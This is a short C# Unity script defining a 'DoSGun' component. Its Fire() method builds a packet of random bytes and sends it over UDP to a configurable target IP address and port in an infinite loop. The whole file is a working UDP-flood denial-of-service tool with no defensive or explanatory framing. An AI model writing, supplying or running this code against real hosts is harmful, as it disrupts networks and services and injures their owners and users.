using System.Net;
using System.Net.Sockets;

public class DoSGun : MonoBehaviour
{
    public string targetIP;
    public int targetPort;
    public int packetSize;

    public void Fire()
    {
        byte[] packet = new byte[packetSize];

        for (int i = 0; i < packetSize; i++)
        {
            packet[i] = (byte)Random.Range(0, 256);
        }

        IPEndPoint endpoint = new IPEndPoint(IPAddress.Parse(targetIP), targetPort);

        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

        while (true)
        {
            socket.SendTo(packet, endpoint);
        }
    }
}
